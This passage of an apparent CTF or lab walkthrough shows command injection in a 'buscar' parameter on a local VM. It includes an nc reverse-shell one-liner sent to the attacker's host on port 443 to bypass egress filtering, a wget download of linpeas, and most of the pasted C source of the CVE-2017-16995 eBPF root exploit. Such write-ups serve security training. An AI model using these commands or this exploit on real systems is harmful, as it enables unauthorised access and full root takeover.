<span class="o">[</span>INFO<span class="o">]</span><span class="w"> </span>Starting<span class="w"> </span>queued<span class="w"> </span>job<span class="w"> </span>on<span class="w"> </span>target:<span class="w"> </span>http://192.168.0.28/site/js/FUZZ

<span class="o">[</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">949</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">64</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">17</span><span class="o">]</span><span class="w">                                                                                                                                                                                                                                                                               </span>
<span class="p">|</span><span class="w"> </span>URL<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://192.168.0.28/site/js/
<span class="w">    </span>*<span class="w"> </span>FUZZ:<span class="w"> </span>

<span class="o">[</span>INFO<span class="o">]</span><span class="w"> </span>Starting<span class="w"> </span>queued<span class="w"> </span>job<span class="w"> </span>on<span class="w"> </span>target:<span class="w"> </span>http://192.168.0.28/site/assets/img/FUZZ

<span class="o">[</span>Status:<span class="w"> </span><span class="m">200</span>,<span class="w"> </span>Size:<span class="w"> </span><span class="m">1811</span>,<span class="w"> </span>Words:<span class="w"> </span><span class="m">98</span>,<span class="w"> </span>Lines:<span class="w"> </span><span class="m">21</span><span class="o">]</span><span class="w">                                                                                                                                                                                                                                                                              </span>
<span class="p">|</span><span class="w"> </span>URL<span class="w"> </span><span class="p">|</span><span class="w"> </span>http://192.168.0.28/site/assets/img/
<span class="w">    </span>*<span class="w"> </span>FUZZ:<span class="w"> </span>

::<span class="w"> </span>Progress:<span class="w"> </span><span class="o">[</span><span class="m">53168</span>/53168<span class="o">]</span><span class="w"> </span>::<span class="w"> </span>Job<span class="w"> </span><span class="o">[</span><span class="m">6</span>/6<span class="o">]</span><span class="w"> </span>::<span class="w"> </span><span class="m">6655</span><span class="w"> </span>req/sec<span class="w"> </span>::<span class="w"> </span>Duration:<span class="w"> </span><span class="o">[</span><span class="m">0</span>:00:06<span class="o">]</span><span class="w"> </span>::<span class="w"> </span>Errors:<span class="w"> </span><span class="m">24</span><span class="w"> </span>::
</code></pre></div></td></tr></table></div>
<p>We find a wordpress folder with a config.php. It seems like it's the only file in there. No other interesting folders found</p>
<h3 id="website">Website</h3>
<p>Looking at the website it seems like a simple  template based on bootstrap. Checking the menu items we stumble upon a php file</p>
<p><img alt="image-20211116230036956" src="../assets/image-20211116230036956-16371000408011.png" /></p>
<p>Adding some values to the <code>buscar</code> parameter we discover a low hanging fruit, a RCE (remote code execution)</p>
<p><img alt="image-20211116230347811" src="../assets/image-20211116230347811.png" /></p>
<p>We intercept the request with burpsuite and send it to the repeater so we can easily manipulate the values for the buscar parameter.</p>
<p><img alt="image-20211116230801325" src="../assets/image-20211116230801325.png" /></p>
<p>In the repeater tab we confirm it still works.</p>
<p><img alt="image-20211116231051128" src="../assets/image-20211116231051128.png" /></p>
<p>Now we try a bash reverse shell. We look at <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md">PayloadsAllTheThings</a> for a reverse shell. After trying and failing with a bash reverse shell we try the mostly reliable nc reverse shell</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>rm<span class="w"> </span>/tmp/f<span class="p">;</span>mkfifo<span class="w"> </span>/tmp/f<span class="p">;</span>cat<span class="w"> </span>/tmp/f<span class="p">|</span>/bin/sh<span class="w"> </span>-i<span class="w"> </span><span class="m">2</span>&gt;<span class="p">&amp;</span><span class="m">1</span><span class="p">|</span>nc<span class="w"> </span><span class="m">192</span>.168.0.14<span class="w"> </span><span class="m">4242</span><span class="w"> </span>&gt;/tmp/f
</code></pre></div></td></tr></table></div>
<p>We add this to the buscar parameter and url-encode it so we get</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f<span class="p">|</span>/bin/sh+-i+2&gt;%261<span class="p">|</span>nc+192.168.0.14+2424+&gt;/tmp/f
</code></pre></div></td></tr></table></div>
<p>We still got nothing but we can see the command tries to connect and after a while it has a time-out. So there has to be some kind of firewall or ids that prevents outgoing connections. We can try random higher ports but it seems like it's blocked. So let's try with some well-known ports every web-server may have open (since it's running and hosting a web-site). We start with port 443 (https) and we get in at the first attempt.</p>
<p>On the attacker machine start nc listener on port 443:</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>nc -nlvp 443
</code></pre></div></td></tr></table></div>
<p>The buscar-parameter value we change the port, add it in burpsuite and hit send</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2&gt;%261|nc+192.168.0.14+2424+&gt;/tmp/f
</code></pre></div></td></tr></table></div>
<p><img alt="image-20211116233727649" src="../assets/image-20211116233727649.png" /></p>
<p>And we have a shell:</p>
<p><img alt="image-20211116233857658" src="../assets/image-20211116233857658.png" /></p>
<p>Now we need to stabilize the shell</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span>
<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code>python3 -c &quot;import pty; pty.spawn(&#39;/bin/bash&#39;)&quot;
CTRL + Z and type in:
stty raw -echo &amp;&amp; fg
export TERM=xterm-256-color
</code></pre></div></td></tr></table></div>
<p>Now the shell is stable with tab complete</p>
<h2 id="exploitation-research">Exploitation Research</h2>
<p><code>sudo -l</code>, setuid search and crontab list don't give as any result. But we see it's a pretty old kernel version. Anyway, we decide to run leanpeas and see what we get</p>
<p>We need to download or move <a href="https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/linpeas.sh">linpeas.sh</a> in a folder where we are gonna start a python web server. Since we know that ports are blocked, we use port 443 again , but we have to run this command as root.</p>
<p>On the attacker machine:</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span></pre></div></td><td class="code"><div><pre><span></span><code>sudo python -m SimpleHTTPServer 443
</code></pre></div></td></tr></table></div>
<p>On the victim machine we move to a writable folder and download linpeas.sh</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">1</span>
<span class="normal">2</span>
<span class="normal">3</span>
<span class="normal">4</span></pre></div></td><td class="code"><div><pre><span></span><code>cd /tmp
wget 192.168.0.14:443/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh | tee linpeas.txt
</code></pre></div></td></tr></table></div>
<p>The last tee command is used to be able to watch linpeas work and at the same time write the results to the .txt file.</p>
<p>Wee look for yellow/red and red entries</p>
<p>One of the first entries is:</p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"> 1</span>
<span class="normal"> 2</span>
<span class="normal"> 3</span>
<span class="normal"> 4</span>
<span class="normal"> 5</span>
<span class="normal"> 6</span>
<span class="normal"> 7</span>
<span class="normal"> 8</span>
<span class="normal"> 9</span>
<span class="normal">10</span>
<span class="normal">11</span>
<span class="normal">12</span>
<span class="normal">13</span>
<span class="normal">14</span>
<span class="normal">15</span>
<span class="normal">16</span>
<span class="normal">17</span>
<span class="normal">18</span>
<span class="normal">19</span>
<span class="normal">20</span></pre></div></td><td class="code"><div><pre><span></span><code>╔══════════╣ Executing Linux Exploit Suggester 2
╚ https://github.com/jondonas/linux-exploit-suggester-2                                                                                                                                                                                                                                                                      

  #############################
    Linux Exploit Suggester 2
  #############################

  Local Kernel: 4.4.0
  Searching 72 exploits...

  Possible Exploits
  [1] af_packet
      CVE-2016-8655
      Source: http://www.exploit-db.com/exploits/40871
  [2] exploit_x
      CVE-2018-14665
      Source: http://www.exploit-db.com/exploits/45697
  [3] get_rekt
      CVE-2017-16695
      Source: http://www.exploit-db.com/exploits/45010
</code></pre></div></td></tr></table></div>
<h2 id="exploitation">Exploitation</h2>
<h3 id="exploit">Exploit</h3>
<p>First exploit didn't work for me, second exploit needed x11 so I didn't even try. So let's try the third one.</p>
<p>Visit the link and read the comments in the code (how to use it, how to compile and things like that)</p>
<p>Open vim and paste the code into vim. I've named the file <code>exploit.c</code></p>
<div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal">  1</span>
<span class="normal">  2</span>
<span class="normal">  3</span>
<span class="normal">  4</span>
<span class="normal">  5</span>
<span class="normal">  6</span>
<span class="normal">  7</span>
<span class="normal">  8</span>
<span class="normal">  9</span>
<span class="normal"> 10</span>
<span class="normal"> 11</span>
<span class="normal"> 12</span>
<span class="normal"> 13</span>
<span class="normal"> 14</span>
<span class="normal"> 15</span>
<span class="normal"> 16</span>
<span class="normal"> 17</span>
<span class="normal"> 18</span>
<span class="normal"> 19</span>
<span class="normal"> 20</span>
<span class="normal"> 21</span>
<span class="normal"> 22</span>
<span class="normal"> 23</span>
<span class="normal"> 24</span>
<span class="normal"> 25</span>
<span class="normal"> 26</span>
<span class="normal"> 27</span>
<span class="normal"> 28</span>
<span class="normal"> 29</span>
<span class="normal"> 30</span>
<span class="normal"> 31</span>
<span class="normal"> 32</span>
<span class="normal"> 33</span>
<span class="normal"> 34</span>
<span class="normal"> 35</span>
<span class="normal"> 36</span>
<span class="normal"> 37</span>
<span class="normal"> 38</span>
<span class="normal"> 39</span>
<span class="normal"> 40</span>
<span class="normal"> 41</span>
<span class="normal"> 42</span>
<span class="normal"> 43</span>
<span class="normal"> 44</span>
<span class="normal"> 45</span>
<span class="normal"> 46</span>
<span class="normal"> 47</span>
<span class="normal"> 48</span>
<span class="normal"> 49</span>
<span class="normal"> 50</span>
<span class="normal"> 51</span>
<span class="normal"> 52</span>
<span class="normal"> 53</span>
<span class="normal"> 54</span>
<span class="normal"> 55</span>
<span class="normal"> 56</span>
<span class="normal"> 57</span>
<span class="normal"> 58</span>
<span class="normal"> 59</span>
<span class="normal"> 60</span>
<span class="normal"> 61</span>
<span class="normal"> 62</span>
<span class="normal"> 63</span>
<span class="normal"> 64</span>
<span class="normal"> 65</span>
<span class="normal"> 66</span>
<span class="normal"> 67</span>
<span class="normal"> 68</span>
<span class="normal"> 69</span>
<span class="normal"> 70</span>
<span class="normal"> 71</span>
<span class="normal"> 72</span>
<span class="normal"> 73</span>
<span class="normal"> 74</span>
<span class="normal"> 75</span>
<span class="normal"> 76</span>
<span class="normal"> 77</span>
<span class="normal"> 78</span>
<span class="normal"> 79</span>
<span class="normal"> 80</span>
<span class="normal"> 81</span>
<span class="normal"> 82</span>
<span class="normal"> 83</span>
<span class="normal"> 84</span>
<span class="normal"> 85</span>
<span class="normal"> 86</span>
<span class="normal"> 87</span>
<span class="normal"> 88</span>
<span class="normal"> 89</span>
<span class="normal"> 90</span>
<span class="normal"> 91</span>
<span class="normal"> 92</span>
<span class="normal"> 93</span>
<span class="normal"> 94</span>
<span class="normal"> 95</span>
<span class="normal"> 96</span>
<span class="normal"> 97</span>
<span class="normal"> 98</span>
<span class="normal"> 99</span>
<span class="normal">100</span>
<span class="normal">101</span>
<span class="normal">102</span>
<span class="normal">103</span>
<span class="normal">104</span>
<span class="normal">105</span>
<span class="normal">106</span>
<span class="normal">107</span>
<span class="normal">108</span>
<span class="normal">109</span>
<span class="normal">110</span>
<span class="normal">111</span>
<span class="normal">112</span>
<span class="normal">113</span>
<span class="normal">114</span>
<span class="normal">115</span>
<span class="normal">116</span>
<span class="normal">117</span>
<span class="normal">118</span>
<span class="normal">119</span>
<span class="normal">120</span>
<span class="normal">121</span>
<span class="normal">122</span>
<span class="normal">123</span>
<span class="normal">124</span>
<span class="normal">125</span>
<span class="normal">126</span>
<span class="normal">127</span>
<span class="normal">128</span>
<span class="normal">129</span>
<span class="normal">130</span>
<span class="normal">131</span>
<span class="normal">132</span>
<span class="normal">133</span>
<span class="normal">134</span>
<span class="normal">135</span>
<span class="normal">136</span>
<span class="normal">137</span>
<span class="normal">138</span>
<span class="normal">139</span>
<span class="normal">140</span>
<span class="normal">141</span>
<span class="normal">142</span>
<span class="normal">143</span>
<span class="normal">144</span>
<span class="normal">145</span>
<span class="normal">146</span>
<span class="normal">147</span>
<span class="normal">148</span>
<span class="normal">149</span>
<span class="normal">150</span>
<span class="normal">151</span>
<span class="normal">152</span>
<span class="normal">153</span>
<span class="normal">154</span>
<span class="normal">155</span>
<span class="normal">156</span>
<span class="normal">157</span>
<span class="normal">158</span>
<span class="normal">159</span>
<span class="normal">160</span>
<span class="normal">161</span>
<span class="normal">162</span>
<span class="normal">163</span>
<span class="normal">164</span>
<span class="normal">165</span>
<span class="normal">166</span>
<span class="normal">167</span>
<span class="normal">168</span>
<span class="normal">169</span>
<span class="normal">170</span>
<span class="normal">171</span>
<span class="normal">172</span>
<span class="normal">173</span>
<span class="normal">174</span>
<span class="normal">175</span>
<span class="normal">176</span>
<span class="normal">177</span>
<span class="normal">178</span>
<span class="normal">179</span>
<span class="normal">180</span>
<span class="normal">181</span>
<span class="normal">182</span>
<span class="normal">183</span>
<span class="normal">184</span>
<span class="normal">185</span>
<span class="normal">186</span>
<span class="normal">187</span>
<span class="normal">188</span>
<span class="normal">189</span>
<span class="normal">190</span>
<span class="normal">191</span>
<span class="normal">192</span>
<span class="normal">193</span>
<span class="normal">194</span>
<span class="normal">195</span>
<span class="normal">196</span>
<span class="normal">197</span>
<span class="normal">198</span>
<span class="normal">199</span>
<span class="normal">200</span>
<span class="normal">201</span>
<span class="normal">202</span>
<span class="normal">203</span>
<span class="normal">204</span>
<span class="normal">205</span>
<span class="normal">206</span>
<span class="normal">207</span>
<span class="normal">208</span>
<span class="normal">209</span>
<span class="normal">210</span>
<span class="normal">211</span>
<span class="normal">212</span>
<span class="normal">213</span>
<span class="normal">214</span>
<span class="normal">215</span>
<span class="normal">216</span>
<span class="normal">217</span>
<span class="normal">218</span>
<span class="normal">219</span>
<span class="normal">220</span>
<span class="normal">221</span>
<span class="normal">222</span>
<span class="normal">223</span>
<span class="normal">224</span>
<span class="normal">225</span>
<span class="normal">226</span>
<span class="normal">227</span>
<span class="normal">228</span>
<span class="normal">229</span>
<span class="normal">230</span>
<span class="normal">231</span>
<span class="normal">232</span>
<span class="normal">233</span>
<span class="normal">234</span>
<span class="normal">235</span>
<span class="normal">236</span>
<span class="normal">237</span>
<span class="normal">238</span>
<span class="normal">239</span>
<span class="normal">240</span>
<span class="normal">241</span>
<span class="normal">242</span>
<span class="normal">243</span>
<span class="normal">244</span>
<span class="normal">245</span>
<span class="normal">246</span>
<span class="normal">247</span>
<span class="normal">248</span>
<span class="normal">249</span>
<span class="normal">250</span>
<span class="normal">251</span>
<span class="normal">252</span>
<span class="normal">253</span>
<span class="normal">254</span>
<span class="normal">255</span>
<span class="normal">256</span>
<span class="normal">257</span>
<span class="normal">258</span>
<span class="normal">259</span>
<span class="normal">260</span>
<span class="normal">261</span>
<span class="normal">262</span>
<span class="normal">263</span>
<span class="normal">264</span>
<span class="normal">265</span>
<span class="normal">266</span>
<span class="normal">267</span>
<span class="normal">268</span>
<span class="normal">269</span>
<span class="normal">270</span>
<span class="normal">271</span>
<span class="normal">272</span>
<span class="normal">273</span>
<span class="normal">274</span>
<span class="normal">275</span>
<span class="normal">276</span>
<span class="normal">277</span>
<span class="normal">278</span>
<span class="normal">279</span>
<span class="normal">280</span>
<span class="normal">281</span>
<span class="normal">282</span>
<span class="normal">283</span>
<span class="normal">284</span>
<span class="normal">285</span>
<span class="normal">286</span>
<span class="normal">287</span>
<span class="normal">288</span>
<span class="normal">289</span>
<span class="normal">290</span>
<span class="normal">291</span>
<span class="normal">292</span>
<span class="normal">293</span>
<span class="normal">294</span>
<span class="normal">295</span>
<span class="normal">296</span>
<span class="normal">297</span>
<span class="normal">298</span>
<span class="normal">299</span>
<span class="normal">300</span>
<span class="normal">301</span>
<span class="normal">302</span>
<span class="normal">303</span>
<span class="normal">304</span>
<span class="normal">305</span>
<span class="normal">306</span>
<span class="normal">307</span>
<span class="normal">308</span>
<span class="normal">309</span>
<span class="normal">310</span>
<span class="normal">311</span>
<span class="normal">312</span>
<span class="normal">313</span>
<span class="normal">314</span>
<span class="normal">315</span>
<span class="normal">316</span>
<span class="normal">317</span>
<span class="normal">318</span>
<span class="normal">319</span>
<span class="normal">320</span>
<span class="normal">321</span>
<span class="normal">322</span>
<span class="normal">323</span>
<span class="normal">324</span>
<span class="normal">325</span>
<span class="normal">326</span>
<span class="normal">327</span>
<span class="normal">328</span>
<span class="normal">329</span>
<span class="normal">330</span>
<span class="normal">331</span>
<span class="normal">332</span>
<span class="normal">333</span>
<span class="normal">334</span>
<span class="normal">335</span>
<span class="normal">336</span>
<span class="normal">337</span>
<span class="normal">338</span>
<span class="normal">339</span>
<span class="normal">340</span>
<span class="normal">341</span>
<span class="normal">342</span>
<span class="normal">343</span>
<span class="normal">344</span>
<span class="normal">345</span>
<span class="normal">346</span>
<span class="normal">347</span>
<span class="normal">348</span>
<span class="normal">349</span>
<span class="normal">350</span>
<span class="normal">351</span>
<span class="normal">352</span>
<span class="normal">353</span>
<span class="normal">354</span>
<span class="normal">355</span>
<span class="normal">356</span>
<span class="normal">357</span>
<span class="normal">358</span>
<span class="normal">359</span>
<span class="normal">360</span>
<span class="normal">361</span>
<span class="normal">362</span>
<span class="normal">363</span>
<span class="normal">364</span>
<span class="normal">365</span>
<span class="normal">366</span>
<span class="normal">367</span>
<span class="normal">368</span>
<span class="normal">369</span>
<span class="normal">370</span>
<span class="normal">371</span>
<span class="normal">372</span>
<span class="normal">373</span>
<span class="normal">374</span>
<span class="normal">375</span>
<span class="normal">376</span>
<span class="normal">377</span>
<span class="normal">378</span>
<span class="normal">379</span>
<span class="normal">380</span>
<span class="normal">381</span>
<span class="normal">382</span>
<span class="normal">383</span>
<span class="normal">384</span>
<span class="normal">385</span>
<span class="normal">386</span>
<span class="normal">387</span>
<span class="normal">388</span>
<span class="normal">389</span>
<span class="normal">390</span>
<span class="normal">391</span>
<span class="normal">392</span>
<span class="normal">393</span>
<span class="normal">394</span>
<span class="normal">395</span>
<span class="normal">396</span>
<span class="normal">397</span>
<span class="normal">398</span>
<span class="normal">399</span>
<span class="normal">400</span>
<span class="normal">401</span>
<span class="normal">402</span>
<span class="normal">403</span>
<span class="normal">404</span>
<span class="normal">405</span>
<span class="normal">406</span>
<span class="normal">407</span>
<span class="normal">408</span>
<span class="normal">409</span>
<span class="normal">410</span>
<span class="normal">411</span>
<span class="normal">412</span>
<span class="normal">413</span>
<span class="normal">414</span>
<span class="normal">415</span>
<span class="normal">416</span>
<span class="normal">417</span>
<span class="normal">418</span>
<span class="normal">419</span>
<span class="normal">420</span>
<span class="normal">421</span>
<span class="normal">422</span>
<span class="normal">423</span>
<span class="normal">424</span>
<span class="normal">425</span>
<span class="normal">426</span>
<span class="normal">427</span>
<span class="normal">428</span>
<span class="normal">429</span>
<span class="normal">430</span>
<span class="normal">431</span>
<span class="normal">432</span>
<span class="normal">433</span>
<span class="normal">434</span>
<span class="normal">435</span>
<span class="normal">436</span>
<span class="normal">437</span>
<span class="normal">438</span>
<span class="normal">439</span>
<span class="normal">440</span>
<span class="normal">441</span>
<span class="normal">442</span>
<span class="normal">443</span>
<span class="normal">444</span>
<span class="normal">445</span>
<span class="normal">446</span>
<span class="normal">447</span>
<span class="normal">448</span>
<span class="normal">449</span>
<span class="normal">450</span>
<span class="normal">451</span>
<span class="normal">452</span>
<span class="normal">453</span>
<span class="normal">454</span>
<span class="normal">455</span>
<span class="normal">456</span>
<span class="normal">457</span>
<span class="normal">458</span>
<span class="normal">459</span>
<span class="normal">460</span>
<span class="normal">461</span>
<span class="normal">462</span>
<span class="normal">463</span>
<span class="normal">464</span>
<span class="normal">465</span>
<span class="normal">466</span>
<span class="normal">467</span>
<span class="normal">468</span>
<span class="normal">469</span>
<span class="normal">470</span>
<span class="normal">471</span>
<span class="normal">472</span>
<span class="normal">473</span>
<span class="normal">474</span>
<span class="normal">475</span>
<span class="normal">476</span>
<span class="normal">477</span>
<span class="normal">478</span>
<span class="normal">479</span>
<span class="normal">480</span>
<span class="normal">481</span>
<span class="normal">482</span>
<span class="normal">483</span>
<span class="normal">484</span>
<span class="normal">485</span>
<span class="normal">486</span>
<span class="normal">487</span>
<span class="normal">488</span>
<span class="normal">489</span>
<span class="normal">490</span>
<span class="normal">491</span>
<span class="normal">492</span>
<span class="normal">493</span>
<span class="normal">494</span>
<span class="normal">495</span></pre></div></td><td class="code"><div><pre><span></span><code><span class="cm">/*</span>
<span class="cm">  Credit @bleidl, this is a slight modification to his original POC</span>
<span class="cm">  https://github.com/brl/grlh/blob/master/get-rekt-linux-hardened.c</span>

<span class="cm">  For details on how the exploit works, please visit</span>
<span class="cm">  https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html</span>

<span class="cm">  Tested on Ubuntu 16.04 with the following Kernels</span>
<span class="cm">  4.4.0-31-generic</span>
<span class="cm">  4.4.0-62-generic</span>
<span class="cm">  4.4.0-81-generic</span>
<span class="cm">  4.4.0-116-generic</span>
<span class="cm">  4.8.0-58-generic</span>
<span class="cm">  4.10.0.42-generic</span>
<span class="cm">  4.13.0-21-generic</span>

<span class="cm">  Tested on Fedora 27</span>
<span class="cm">  4.13.9-300</span>
<span class="cm">  gcc cve-2017-16995.c -o cve-2017-16995</span>
<span class="cm">  internet@client:~/cve-2017-16995$ ./cve-2017-16995</span>
<span class="cm">  [.]</span>
<span class="cm">  [.] t(-_-t) exploit for counterfeit grsec kernels such as KSPP and linux-hardened t(-_-t)</span>
<span class="cm">  [.]</span>
<span class="cm">  [.]   ** This vulnerability cannot be exploited at all on authentic grsecurity kernel **</span>
<span class="cm">  [.]</span>
<span class="cm">  [*] creating bpf map</span>
<span class="cm">  [*] sneaking evil bpf past the verifier</span>
<span class="cm">  [*] creating socketpair()</span>
<span class="cm">  [*] attaching bpf backdoor to socket</span>
<span class="cm">  [*] skbuff =&gt; ffff880038c3f500  </span>
<span class="cm">  [*] Leaking sock struct from ffff88003af5e180</span>
<span class="cm">  [*] Sock-&gt;sk_rcvtimeo at offset 472</span>
<span class="cm">  [*] Cred structure at ffff880038704600</span>
<span class="cm">  [*] UID from cred structure: 1000, matches the current: 1000</span>
<span class="cm">  [*] hammering cred structure at ffff880038704600</span>
<span class="cm">  [*] credentials patched, launching shell...</span>
<span class="cm">  #id</span>
<span class="cm">  uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(internet)</span>

<span class="cm">*/</span>

<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;errno.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;fcntl.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdarg.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;string.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;unistd.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;linux/bpf.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;linux/unistd.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/mman.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/types.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/socket.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/un.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/stat.h&gt;</span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;sys/personality.h&gt;</span>

<span class="kt">char</span><span class="w"> </span><span class="n">buffer</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
<span class="kt">int</span><span class="w"> </span><span class="n">sockets</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>
<span class="kt">int</span><span class="w"> </span><span class="n">mapfd</span><span class="p">,</span><span class="w"> </span><span class="n">progfd</span><span class="p">;</span>
<span class="kt">int</span><span class="w"> </span><span class="n">doredact</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>

<span class="cp">#define LOG_BUF_SIZE 65536</span>
<span class="cp">#define PHYS_OFFSET 0xffff880000000000</span>
<span class="kt">char</span><span class="w"> </span><span class="n">bpf_log_buf</span><span class="p">[</span><span class="n">LOG_BUF_SIZE</span><span class="p">];</span>

<span class="k">static</span><span class="w"> </span><span class="n">__u64</span><span class="w"> </span><span class="nf">ptr_to_u64</span><span class="p">(</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="n">ptr</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">__u64</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="kt">unsigned</span><span class="w"> </span><span class="kt">long</span><span class="p">)</span><span class="w"> </span><span class="n">ptr</span><span class="p">;</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">bpf_prog_load</span><span class="p">(</span><span class="k">enum</span><span class="w"> </span><span class="n">bpf_prog_type</span><span class="w"> </span><span class="n">prog_type</span><span class="p">,</span>
<span class="w">          </span><span class="k">const</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_insn</span><span class="w"> </span><span class="o">*</span><span class="n">insns</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">prog_len</span><span class="p">,</span>
<span class="w">          </span><span class="k">const</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">license</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">kern_version</span><span class="p">)</span>
<span class="p">{</span>
<span class="w">    </span><span class="k">union</span><span class="w"> </span><span class="nc">bpf_attr</span><span class="w"> </span><span class="n">attr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span>
<span class="w">        </span><span class="p">.</span><span class="n">prog_type</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">prog_type</span><span class="p">,</span>
<span class="w">        </span><span class="p">.</span><span class="n">insns</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ptr_to_u64</span><span class="p">((</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="n">insns</span><span class="p">),</span>
<span class="w">        </span><span class="p">.</span><span class="n">insn_cnt</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">prog_len</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span><span class="w"> </span><span class="nc">bpf_insn</span><span class="p">),</span>
<span class="w">        </span><span class="p">.</span><span class="n">license</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ptr_to_u64</span><span class="p">((</span><span class="kt">void</span><span class="w"> </span><span class="o">*</span><span class="p">)</span><span class="w"> </span><span class="n">license</span><span class="p">),</span>
<span class="w">        </span><span class="p">.</span><span class="n">log_buf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">ptr_to_u64</span><span class="p">(</span><span class="n">bpf_log_buf</span><span class="p">),</span>
<span class="w">        </span><span class="p">.</span><span class="n">log_size</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LOG_BUF_SIZE</span><span class="p">,</span>
<span class="w">        </span><span class="p">.</span><span class="n">log_level</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span>
<span class="w">    </span><span class="p">};</span>

<span class="w">    </span><span class="n">attr</span><span class="p">.</span><span class="n">kern_version</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">kern_version</span><span class="p">;</span>

<span class="w">    </span><span class="n">bpf_log_buf</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">syscall</span><span class="p">(</span><span class="n">__NR_bpf</span><span class="p">,</span><span class="w"> </span><span class="n">BPF_PROG_LOAD</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">attr</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">attr</span><span class="p">));</span>
<span class="p">}</span>

<span class="kt">int</span><span class="w"> </span><span class="nf">bpf_create_map</span><span class="p">(</span><span class="k">enum</span><span class="w"> </span><span class="n">bpf_map_type</span><span class="w"> </span><span class="n">map_type</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">key_size</span><span class="p">,</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">value_size</span><span class="p">,</span>
